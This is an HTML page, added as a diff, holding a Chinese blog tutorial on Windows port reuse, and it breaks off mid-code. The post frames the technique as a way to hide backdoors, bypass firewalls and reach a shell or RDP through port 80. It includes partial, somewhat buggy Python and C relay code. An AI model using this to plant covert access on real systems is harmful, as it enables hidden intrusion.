@@ -1,0 +1,366 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://github.com/hucmosin/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://github.com/hucmosin">
+<meta name="author" content="Mosin">
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>聊聊端口复用的实现与坑点 - Mosin&#39; Blog</title>
+
+<meta name="keywords" content="端口">
+
+<meta name="description " content="Learning, summarizing, thinking, feeling and knowledge management">
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="聊">聊</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-weixin-mp" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Mosin&#39;s Blog</h1>
+        <h3 class="cover-siteTitle">聊技术，谈情怀</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/hucmosin" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/code-audit" data-name="审计">审计</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/technology" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-share" data-name="分享">分享</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-note" data-name="学习">学习</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others-end" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">Input Search key Words Here</label>
+        <input class="search-field" type="text" name="s" class="text" placeholder="Input Search key Words Here" />
+        <button type="submit" class="search-form-submit" title="Search"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input"  placeholder="请输入关键字"/>   <!-- placeholder="Type something..."/>-->
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://github.com/hucmosin" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="https://github.com/hucmosin" target="_blank">mosin</a>
+                    <span title="最后编辑于2017-11-14">2017-11-14</span>
+                </p>
+                <p>灵魂无处安放,所以选择流浪</p>
+            </div>
+            <h2 class="post-title">聊聊端口复用的实现与坑点</h2>
+            <div class="post-meta">
+                本文总共11933个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h3 id="0x00-开篇"><a href="#0x00-开篇" class="headerlink" title="0x00 开篇"></a>0x00 开篇</h3><p><strong>端口复用一直是木马病毒常用的手段,在我们进行安全测试时,有时也是需要端口复用的。</strong></p>
+<p>端口复用的一般条件有如下一些：</p>
+<blockquote>
+<p>（1）服务器只对外开放某一端口（80端口或其他任意少量端口），其他端口全部被封死</p>
+<p>（2）为了躲避防火墙</p>
+<p>（3）隐藏自己后门</p>
+<p>（4）转发不出端口</p>
+<p>（5）内网渗透（如：当当前服务器处于内网之中，内网IP为10.10.10.10开放终端登录端口但并不对外网开放，通过外网IP：111.111.111.111进行端口映射并只开放80端口，通过端口复用，直连内网）。</p>
+</blockquote>
+<p>综上，所以为了实现我们的各种小目的，端口复用技术，还是有那么点必要。</p>
+<p>本文主要以Windows系统端口复用为主，Linux的端口复用相对于Windows实现大同小异，不做讨论。</p>
+<h3 id="0x01-端口复用要点"><a href="#0x01-端口复用要点" class="headerlink" title="0x01 端口复用要点"></a>0x01 端口复用要点</h3><p>端口复用，不能用一般的<code>socket</code>套接字直接监听，这样会导致程序自身无法运行，或者相关占用端口服务无法运行，所以，办法暂时只有在本地做些手脚。</p>
+<p><strong>第一种，端口复用重定向</strong></p>
+<p>例：在本地建立两个套接字<code>sock1</code>、<code>scok2</code>，<code>scok1</code>监听80端口，当有连接来到时，<code>Sock2</code>连接重定向端口，将<code>Sock1</code>接收到的数据加以判断并通过<code>Sock2</code>转发。这样就能通过访问目标机80端口来连接重定向端口了。</p>
+<p><img src="/allimage/portfu/dkcdx.png" alt="dkcdx"></p>
+<p><strong>第二种，端口复用</strong></p>
+<p>例：在本地建立一个监听和本地开放一样的端口如80端口，当有连接来到时，判断是否是自己的数据包，如果是则处理数据，否则不处理，交给源程序。</p>
+<p><img src="/allimage/portfu/dkfuy.png" alt="dkfuy"></p>
+<p>端口复用其实没有大家想象的那么神秘和复杂，其中端口重定向只是利用了本地环回地址127.0.0.1转发接收外来数据，端口复用只是利用了<code>socket</code>的相关特性，仅此而已。</p>
+<p>TCP的端口复用就一段代码实现，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line"></span><br><span class="line">setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&amp;buf,1));</span><br><span class="line"></span><br><span class="line">server.sin_family=AF_INET;</span><br><span class="line"></span><br><span class="line">server.sin_port=htons(80);</span><br><span class="line"></span><br><span class="line">server.sin_addr.s_addr=htonl(“127.0.0.1”);</span><br></pre></td></tr></table></figure>
+<p>在端口复用技术中最重要的一个函数是<code>setsockopt()</code>,这个函数就决定了端口的重绑定问题。</p>
+<p>百度百科的解释：<code>setsockopt()</code>函数，用于任意类型、任意状态<a href="https://baike.baidu.com/item/%E5%A5%97%E6%8E%A5%E5%8F%A3" target="_blank" rel="external">套接口</a>的设置选项值。尽管在不同协议层上存在选项，但本函数仅定义了最高的“套接口”层次上的选项。</p>
+<p>在缺省条件下，一个<a href="https://baike.baidu.com/item/%E5%A5%97%E6%8E%A5%E5%8F%A3" target="_blank" rel="external">套接口</a>不能与一个已在使用中的本地地址捆绑（<a href="https://baike.baidu.com/item/bind(" target="_blank" rel="external">bind()</a>)）。但有时会需要“重用”地址。因为每一个连接都由本地地址和远端地址的组合唯一确定，所以只要远端地址不同，两个套接口与一个地址捆绑并无大碍。为了通知套接口实现不要因为一个地址已被一个套接口使用就不让它与另一个套接口捆绑，应用程序可在<code>bind()</code>调用前先设置<code>SO_REUSEADDR</code>选项。请注意仅在<code>bind()</code>调用时该选项才被解释；故此无需（但也无害）将一个不会共用地址的<a href="https://baike.baidu.com/item/%E5%A5%97%E6%8E%A5%E5%8F%A3" target="_blank" rel="external">套接口</a>设置该选项，或者在<code>bind()</code>对这个或其他套接口无影响情况下设置或清除这一选项。</p>
+<p>我们这里要使用的是<code>socket</code>中的<code>SO_REUSEADDR</code>，下面是它的解释。</p>
+<p>SO_REUSEADDR 提供如下四个功能：</p>
+<blockquote>
+<p>SO_REUSEADDR：允许启动一个监听服务器并捆绑其众所周知端口，即使以前建立的将此端口用做他们的本地端口的连接仍存在。这通常是重启监听服务器时出现，若不设置此选项，则bind时将出错。<br>SO_REUSEADDR：允许在同一端口上启动同一服务器的多个实例，只要每个实例捆绑一个不同的本地IP地址即可。对于TCP，我们根本不可能启动捆绑相同IP地址和相同端口号的多个服务器。<br>SO_REUSEADDR：允许单个进程捆绑同一端口到多个套接口上，只要每个捆绑指定不同的本地IP地址即可。这一般不用于TCP服务器。<br>SO_REUSEADDR：允许完全重复的捆绑：当一个IP地址和端口绑定到某个套接口上时，还允许此IP地址和端口捆绑到另一个套接口上。一般来说，这个特性仅在支持多播的系统上才有，而且只对UDP套接口而言（TCP不支持多播）。 </p>
+</blockquote>
+<p>一般地，我们需要设置<code>socket</code>为非阻塞模式，缘由如果我们是阻塞模式，有可能会导致原有占用端口服务无法使用或自身程序无法使用，由此可见，端口复用使用非阻塞模式是比较保险的。</p>
+<p>然而理论事实是需要检验的，当有些端口设置非阻塞时，缘由它的数据传输连续性，可能会导致数据接收异常或者无法接收到数据情况，非阻塞对于短暂型连接影响不大，但对持久性连接可能会有影响，比如3389端口的转发复用，所以使用非阻塞需要视端口情况而定。</p>
+<p><strong>阻塞</strong><br>​        阻塞调用是指调用结果返回之前，当前线程会被挂起（线程进入非可执行状态，在这个状态下，cpu不会给线程分配时间片，即线程暂停运行）。函数只有在得到结果之后才会返回。</p>
+<p><img src="/allimage/portfu/zusai.png" alt="zusai"></p>
+<p><strong>非阻塞</strong><br>​      非阻塞和阻塞的概念相对应，指在不能立刻得到结果之前，该函数不会阻塞当前线程，而会立刻返回。</p>
+<p><img src="/allimage/portfu/feizusai.jpg" alt="feizusai"></p>
+<h3 id="0x02-端口复用的坑点"><a href="#0x02-端口复用的坑点" class="headerlink" title="0x02 端口复用的坑点"></a>0x02 端口复用的坑点</h3><p>在端口复用上可分为<strong>理论</strong>和<strong>实战</strong>，下面来细细谈谈其中的坑点。</p>
+<p>理论：在理论上，我们通过端口复用技术，不会对其他占用此端口的程序或者进程造成影响，因为我们设置了<code>socket</code>为<code>SO_REUSEADDR</code>，监听<code>0.0.0.0:80</code>和监听<code>192.168.1.1:80</code>或者监听<code>127.0.0.1:80</code>，他们的地址是不同的，创建了程序或者进程所接收到的流量是相互不影响的，多个线程或进程互不影响。</p>
+<p>实战：在Windows中，我们设置了<code>socket</code>为<code>SO_REUSEADDR</code>，但是无法开启端口复用程序，关闭Web服务程序，端口复用程序可用但Web服务程序又无法使用，只能存在一样，所以端口复用是鸡肋是备胎。哦，不，是千斤顶，换备胎的时候用一下。</p>
+<p>在理论上，我们的想法是完美的，然而现实确是，你设置了<code>socket</code>为<code>SO_REUSEADDR</code>并没有想象中的那么大作用。</p>
+<p>当程序编写人员<code>socket</code>在绑定前需要使用<code>setsockopt</code>指定<code>SO_EXCLUSIVEADDRUSE</code>要求独占所有的端口地址，而不允许复用。这样其它人就无法复用这个端口了，即使你设置了<code>socket</code>为<code>SO_REUSEADDR</code>也没有用，程序根本跑不起来。</p>
+<p>在windows上测试端口复用时，当启动iis服务，端口复用程序无法正常运行，开启端口复用程序时IIS无法正常使用，后查阅相关文档得知，原因是从IIS6.0开始，微软将网络通信的过程封装在了ring0层，使用了http.sys这个驱动来直接进行网络通信。一个设置了<code>SO_REUSEADDR</code>的<code>socket</code>总是可以绑定到已经被绑定过的源地址和源端口，不管之前在这个地址和端口上绑定的<code>socket</code>是否设置了<code>SO_REUSEADDR</code>没有。这种操作对系统的安全性产生了极大的影响，于是乎，Microsoft就加入了另一个<code>socket</code>选项: <code>SO_EXECLUSIVEADDRUSE</code>。设置了<code>SO_EXECLUSIVEADDRUSE</code>的<code>socket</code>确保一旦绑定成功，那么被绑定的源端口和地址就只属于这一个<code>socket</code>，其它的<code>socket</code>都不能绑定，甚至他们使用了<code>SO_REUSEADDR</code>请求端口复用也没用(当然你也可以修改iis的监听地址或者注入<code>http.sys</code>驱动，不过这在实战中不太现实）。</p>
+<p>在这其中，也有例外，比如apache和其他运行在应用层上的服务器中间件，在他们开放的端口上是可以进行端口复用的，不过这样，端口复用的范围就小了许多。</p>
+<p>然而你们以为事实上就这样了吗？NO!NO!NO!</p>
+<p>端口的流量是通过协议完成的，一旦多个协议通过一个端口，流量就只会流向一个连接，流量流向最先一个（最后一个）建立连接的<code>socket</code>,其他的<code>socket</code>可能会连接WAIT，等待数据连接中断或者完成数据传输后正常退出，而另外一个连接就会阻塞而无法使用，所以应了那句中国谚语“一山不容二虎”(用分流数据转发这样发生的几率会小一些)。</p>
+<p>数据分流的话，和<code>burp</code>和<code>Fiddler</code>的原理一样，采用代理中转的方式进行中间人转发，这样就既可以保证端口的复用，又可以保证数据的完整性。</p>
+<p>绕过这些坑点的方法有很多的思路，举几个例子</p>
+<p>1、本地端口代理中转转发</p>
+<p>2、Hook注入</p>
+<p>3、驱动注入</p>
+<p>绕过方法不在本文讨论范围内。^__^</p>
+<h3 id="0x03-端口复用过程"><a href="#0x03-端口复用过程" class="headerlink" title="0x03 端口复用过程"></a>0x03 端口复用过程</h3><p>原理和坑点讲完了，还是来讲一下端口复用的具体细节吧（即使现在我们知道了端口复用的尿性）</p>
+<p><strong>实验说明：本文实验均在理论试验中，所有服务中间件均在系统应用层运行。</strong></p>
+<p>目前绑定端口复用有两种：</p>
+<blockquote>
+<p>复用端口重定向</p>
+<p>复用端口</p>
+</blockquote>
+<p><strong>（一）复用端口重定向</strong></p>
+<p>使用条件：</p>
+<p>原先存在80端口，并且监听80端口，需要复用80端口重定向到3389（其他任意）端口</p>
+<p>准备环境：</p>
+<p>这里我用jspstudy搭建一个网页服务器，用虚拟机模拟外部环境</p>
+<blockquote>
+<p>Windows7服务器：IP：192.168.1.8，开放80端口，3389端口</p>
+<p>Win2008  虚拟机：IP：192.168.19.130</p>
+</blockquote>
+<p>我们开启服务器并查看开放的端口，可以看到我们开放了80端口和3389端口</p>
+<p><img src="/allimage/portfu/kaiq3389.png" alt="kaiq3389"></p>
+<p>我们现在启动端口复用工具，看看网页是否正常</p>
+<p><img src="/allimage/portfu/3389test.png" alt="3389test"></p>
+<p>接着win2008服务器192.168.19.130打开远程桌面连接器连接192.168.1.8的80端口</p>
+<p><img src="/allimage/portfu/conn33891.png" alt="conn33891"></p>
+<p><img src="/allimage/portfu/conn33892.png" alt="conn33892"></p>
+<p>可以看到，我们成功的连接到了192.168.1.8的3389端口</p>
+<p><strong>（二）复用端口</strong></p>
+<p>使用条件：</p>
+<p>原先存在80端口，并且监听80端口，需要复用80端口为23（其他任意）端口</p>
+<p>准备环境：</p>
+<p>这里我用jspstudy搭建一个网页服务器，用虚拟机模拟外部环境</p>
+<blockquote>
+<p>Windows7服务器：IP：192.168.1.8，开放80端口</p>
+<p>Win2008虚拟机：IP：192.168.19.130</p>
+</blockquote>
+<p>这里的端口复用是模拟一个cmd后门，当外部IP：192.168.19.130 telnet本地IP：192.168.1.8时，反弹一个cmsdshell过去。</p>
+<p>启动端口复用工具，telnet连接192.168.1.8的80端口</p>
+<p><img src="/allimage/portfu/opentelnet.jpg" alt="opentelnet"></p>
+<p><img src="/allimage/portfu/acc80.png" alt="acc80"></p>
+<p>可以看到我们成功得到了一个cmd shell的会话。</p>
+<p>好了，具体的理论和坑点和实战我们都做了，那么下面开始我们的源码分析。</p>
+<h3 id="0x04-端口复用源码分析"><a href="#0x04-端口复用源码分析" class="headerlink" title="0x04 端口复用源码分析"></a>0x04 端口复用源码分析</h3><p><strong>（一）：复用端口重定向</strong></p>
+<p>目的：原先存在80端口，并且监听80端口，22，23，3389等端口复用80端口</p>
+<p>复用端口重定向的实现</p>
+<blockquote>
+<p>（1）外部IP连本地IP : 192.168.2.1=&gt;192.168.1.1:80=&gt;127.0.0.1:3389</p>
+<p>（2）本地IP转外部IP : 127.0.0.1:3389=&gt;192.168.1.1:80=&gt;192.168.2.1</p>
+</blockquote>
+<p>首先外部<code>IP(192.168.2.1)</code>连接本地<code>IP(192.168.1.1)</code>的<code>80</code>端口,由于本地<code>IP(192.168.1.1)</code>端口复用绑定了<code>80</code>端口，所以复用绑定端口监听到了外部<code>IP(192.168.2.1)</code>地址流量，判断是否为HTTP流量，如果是则发送回本地<code>80</code>端口，否则本地<code>IP(192.168.1.1)</code>地址连接本地<code>ip(127.0.0.1)</code>的<code>3389</code>端口，从本地<code>IP(127.0.0.1)</code>端口<code>3389</code>获取到的流量由本地<code>IP(192.168.1.1)</code>地址发送到外部<code>IP(192.168.2.1)</code>地址上，这个过程就完成了整个端口复用重定向。</p>
+<p>我们用python代码解释，如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import select</span><br><span class="line"></span><br><span class="line">host=&apos;192.168.1.8&apos;</span><br><span class="line">port=80</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR, 1 ) </span><br><span class="line">s.bind((host,port))</span><br><span class="line">s.listen(10)</span><br><span class="line"></span><br><span class="line">S1=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">S1.connect((&apos;127.0.0.1&apos;,3389))</span><br><span class="line">print &quot;Start Listen 80 =&gt;3389.....&quot;</span><br><span class="line">while 1:</span><br><span class="line">    infds,outfds,errfds=select.select([s,],[],[],5) #转发3389需去除</span><br><span class="line">    if len(infds)!=0:#转发3389需去除</span><br><span class="line">        conn,(addr,port)=s.accept()</span><br><span class="line">        print &apos;[*] connected from &apos;,addr,port</span><br><span class="line">        data=conn.recv(4096)</span><br><span class="line">        S1.send(data)</span><br><span class="line">        recv_data=s1.recv(4096)</span><br><span class="line">        conn.send(recv_data)</span><br><span class="line">print &apos;[-] connected down&apos;,</span><br><span class="line">S1.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<p>首先我们创建了两个套接字<code>s</code>和<code>s1</code>，<code>s</code>绑定<code>80</code>端口，其中<code>setsockopt</code>用到了<code>socket.SO_REUSEADDR</code>以达到端口复用目的，<code>s1</code>连接本地<code>3389</code>端口，<code>s1</code>在这里起到了数据中转的作用，<code>select</code>是我们用来处理阻塞问题的，不过在这里这段代码是有点问题的，这个问题在前文说过，<code>3389</code>端口能够连上,但是数据传输会中断，我们需要开启多线程来保证数据的连续性传输并取消掉<code>select</code>。</p>
+<p>那么如果要区分两者数据呢？</p>
+<p>我们只需要加上一个判断（怎么判断数据标头可以自定义），或者判断自己的标记头。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if &apos;GET&apos; or ‘POST’ in data:</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&apos;127.0.0.1&apos;,80))</span><br><span class="line">    s.send(data)</span><br><span class="line">    bufer=&apos;&apos;</span><br><span class="line">    while 1:</span><br><span class="line">       recv_data=s.recv(4096)</span><br><span class="line">       bufer += recv_data</span><br><span class="line">       if len(recv_data)==0:</span><br><span class="line">          break</span><br></pre></td></tr></table></figure>
+<p>我们把不是我们的数据包中转发给本地环回地址的<code>80</code>端口http服务器。</p>
+<p>以下为C语言实现代码，如下：</p>
+<p>和python的代码一样，首先我们绑定本地监听复用的<code>80</code>端口，其中监听的IP可能会出现问题，那么我们可以换成<code>192.168.1.1</code>，<code>127.0.0.1</code>都是可以的，这里不能用<code>select</code>来处理阻塞，会出问题的，所以我们去掉，最后创建个线程来进行数据传输交互。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">	//初始化操作</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = inet_addr(&quot;0.0.0.0&quot;);</span><br><span class="line">	saddr.sin_port = htons(80);</span><br><span class="line">	if ((server_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;[-] error!socket failed!//n&quot;);</span><br><span class="line">		return (-1);</span><br><span class="line">	&#125;</span><br><span class="line">	//复用操作</span><br><span class="line">	if (setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;val, sizeof(val)) != 0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;[-] error!setsockopt failed!//n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	//绑定操作</span><br><span class="line">	if (bind(server_sock, (SOCKADDR *)&amp;saddr, sizeof(saddr)) == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		ret = GetLastError();</span><br><span class="line">		printf(&quot;[-] error!bind failed!//n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	//监听操作</span><br><span class="line">	listen(server_sock, 2);</span><br><span class="line"></span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		caddsize = sizeof(scaddr);</span><br><span class="line">		server_conn = accept(server_sock, (struct sockaddr *)&amp;scaddr, &amp;caddsize);</span><br><span class="line">		if (server_conn != INVALID_SOCKET)</span><br><span class="line">		&#123;</span><br><span class="line">			cthd = CreateThread(NULL, 0, ClientThread, (LPVOID)server_conn, 0, &amp;tid);</span><br><span class="line">			if (cthd == NULL)</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;[-] Thread Creat Failed!//n&quot;);</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		CloseHandle(cthd);</span><br><span class="line">	&#125;</span><br><span class="line">	closesocket(server_sock);</span><br><span class="line">	WSACleanup();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有一个<code>ClientThread()</code>函数，这个函数是需要在<code>main()</code>函数里面调用的(见如上代码)，这里创建一个套接字来连接本地的<code>3389</code>端口，用<code>while</code>循环来处理复用交互的数据，<code>80</code>端口监听到的数据发送到本地的<code>3389</code>端口上面去，从本地的<code>3389</code>端口读取到的数据用<code>80</code>端口的套接字发送出去，这就构成了端口复用的重定向，当然在这个地方可以像上面python代码一样，在中间加一个数据判断条件，从而保证数据流向的完整和可靠和精准性。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">//创建线程</span><br><span class="line">DWORD WINAPI ClientThread(LPVOID lpParam)</span><br><span class="line">&#123;</span><br><span class="line">	//连接本地目标3389</span><br><span class="line">	saddr.sin_family = AF_INET;</span><br><span class="line">	saddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line">	saddr.sin_port = htons(3389);</span><br><span class="line">	if ((conn_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;[-] error!socket failed!//n&quot;);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	val = 100;</span><br><span class="line">	if (setsockopt(conn_sock, SOL_SOCKET, SO_RCVTIMEO, (char *)&amp;val, sizeof(val)) != 0)</span><br><span class="line">	&#123;</span><br><span class="line">		ret = GetLastError();</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	if (setsockopt(ss, SOL_SOCKET, SO_RCVTIMEO, (char *)&amp;val, sizeof(val)) != 0)</span><br><span class="line">	&#123;</span><br><span class="line">		ret = GetLastError();</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	if (connect(conn_sock, (SOCKADDR *)&amp;saddr, sizeof(saddr)) != 0)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;[-] error!socket connect failed!//n&quot;);</span><br><span class="line">		closesocket(conn_sock);</span><br><span class="line">		closesocket(ss);</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line">	//数据交换处理</span><br><span class="line">	while (1)</span><br><span class="line">	&#123;</span><br><span class="line">		num = recv(ss, buf, 4096, 0);</span><br><span class="line">		if (num &gt; 0)&#123;</span><br><span class="line">			send(conn_sock, buf, num, 0);</span><br><span class="line">		&#125;</span><br><span class="line">		else if (num == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">		num = recv(conn_sock, buf, 4096, 0);</span><br><span class="line">		if (num &gt; 0)</span><br><span class="line">		